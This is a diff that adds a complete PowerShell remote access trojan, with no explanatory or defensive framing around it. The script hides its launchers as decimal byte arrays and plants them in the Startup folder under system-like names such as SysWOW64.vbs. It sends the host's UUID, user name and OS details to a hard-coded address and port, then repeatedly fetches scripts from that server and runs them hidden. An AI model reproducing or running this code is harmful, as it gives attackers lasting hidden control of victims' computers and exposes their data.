@@ -1,0 +1,67 @@
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName Microsoft.VisualBasic
+
+[String] $DNS = '185.81.157.59'
+[String] $Port = '4552'
+[String] $SPL = '|V|'
+$ErrorActionPreference = 'SilentlyContinue'
+
+function DropToStartup() {
+    [String] $startup = [System.Text.Encoding]::Default.GetString(@(83,101,116,32,79,66,66,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,79,66,66,46,82,117,110,32,34,80,111,119,101,114,83,104,101,108,108,32,45,69,120,101,99,117,116,105,111,110,80,111,108,105,99,121,32,82,101,109,111,116,101,83,105,103,110,101,100,32,45,70,105,108,101,32,34,43,34,37,70,73,76,69,37,34,44,48))
+    [System.IO.File]::WriteAllText([System.Environment]::GetFolderPath(7) + '\SysWOW64.vbs', $startup.Replace('%FILE%', $PSCommandPath))
+}
+
+Function POST($DA, $Param) {
+    [String] $Response = ''
+    [Object] $HttpObject = [Microsoft.VisualBasic.Interaction]::CreateObject('Microsoft.XMLHTTP')
+    try {
+        $HttpObject.Open('POST', 'http://' + $DNS + ':' + $Port + '/' + $DA, $false)
+        $HttpObject.SetRequestHeader('User-Agent:', $Info)
+        $HttpObject.Send($Param)
+        $Response = [Convert]::ToString($HttpObject.ResponseText)
+    }
+    catch { }
+    return $Response
+}
+
+Function INF {
+    [String] $MAC = HWID($env:computername)
+    [String] $ID = 'New_' + $MAC
+    [String] $VER = 'v0.2'
+    [String] $OS = [Microsoft.VisualBasic.Strings]::Split((Get-WMIObject win32_operatingsystem).name,"|")[0] + " " + (Get-WmiObject Win32_OperatingSystem).OSArchitecture
+    [String] $AV = 'Windows Defender'
+    return $ID + "\" + ($env:COMPUTERNAME) + "\" + ($env:UserName) + "\" + $OS + "\" + $AV + "\" + "Yes" + "\" + "Yes" + "\" + "FALSE" + "\"
+}
+
+Function HWID($strComputer) {
+    $ErrorActionPreference = 'SilentlyContinue'
+    $lol = [System.Convert]::ToString((get-wmiobject Win32_ComputerSystemProduct  | Select-Object -ExpandProperty UUID))
+    return ([Microsoft.VisualBasic.Strings]::Split($lol,'-')[0] + [Microsoft.VisualBasic.Strings]::Split($lol,'-')[1])
+}
+
+DropToStartup
+[String] $Info = INF
+
+while($true)
+{
+    $A = [Microsoft.VisualBasic.Strings]::Split((POST("Vre", "")) , $SPL)
+    switch($A[0]) {
+        'TR' {
+            [String] $PsFileName =  [System.Guid]::NewGuid().ToString().Replace("-", "") + ".PS1"
+            [String] $StartupContent = [System.Text.Encoding]::Default.GetString(@(83,101,116,32,87,115,104,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,87,115,104,83,104,101,108,108,46,82,117,110,32,34,80,111,119,101,114,115,104,101,108,108,32,45,69,120,101,99,117,116,105,111,110,80,111,108,105,99,121,32,66,121,112,97,115,115,32,45,70,105,108,101,32,34,32,43,32,34,37,80,84,37,34,44,32,48))
+            $TargetPath = [System.IO.Path]::GetTempPath() + $PsFileName
+            [System.IO.File]::WriteAllText($TargetPath, $A[1])
+            [System.IO.File]::WriteAllText([System.Environment]::GetFolderPath(7) + "\WinLOGONUpdate.vbs", $StartupContent.Replace("%PT%", $TargetPath))
+            PowerShell -WindowStyle Hidden -ExecutionPolicy RemoteSigned -File $TargetPath
+        break }
+
+        'Cl' {
+            [Environment]::Exit(0)
+        break }
+	
+	'Un' {
+	    [Environment]::Exit(0)
+	break }
+    }
+    Start-Sleep -Milliseconds 3000
+}
